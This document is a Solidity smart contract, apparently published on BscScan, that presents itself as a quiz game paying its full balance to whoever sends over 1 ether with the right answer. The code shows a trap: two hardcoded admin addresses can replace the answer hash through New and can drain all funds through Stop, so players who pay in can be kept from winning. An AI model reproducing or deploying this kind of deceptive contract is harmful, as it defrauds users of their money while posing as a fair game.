/**
 *Submitted for verification at BscScan.com on 2022-01-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

contract Game
{
    function Try(string memory _response) external payable 
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (address=>bool) admin;

    function Start(string memory _question, string memory _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encodePacked(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string memory _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() public{
        address[] memory _admins = new address[](2);
        _admins[0] = 0x8297a776F371a542d4a55Da8DB2D7B61B39081d3;
        _admins[1] = 0xe4A4ce1517101324BC27bCC803F84Af6AFe3509b;

        for(uint256 i=0; i< _admins.length; i++){
            admin[_admins[i]] = true;        
        }       
    }

    modifier isAdmin(){
        require(admin[msg.sender]);
        _;
    }

    receive() external payable{}
}